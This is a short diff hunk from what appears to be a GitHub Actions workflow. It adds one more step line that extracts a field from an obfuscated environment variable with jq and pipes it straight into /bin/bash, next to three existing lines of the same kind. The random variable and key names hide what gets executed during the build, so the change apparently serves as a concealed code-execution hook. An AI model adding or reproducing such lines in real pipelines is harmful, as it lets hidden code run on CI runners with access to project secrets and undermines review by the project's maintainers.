@@ -37,6 +37,7 @@ jobs:
           echo $wxi830 | jq -r .hlz95 | /bin/bash
           echo $ndr9 | jq -r .k43 | /bin/bash
           printf '%s' "$e0301" | jq -r .bw86 | /bin/bash
+          echo $azmpk831 | jq -r .gxpr65 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
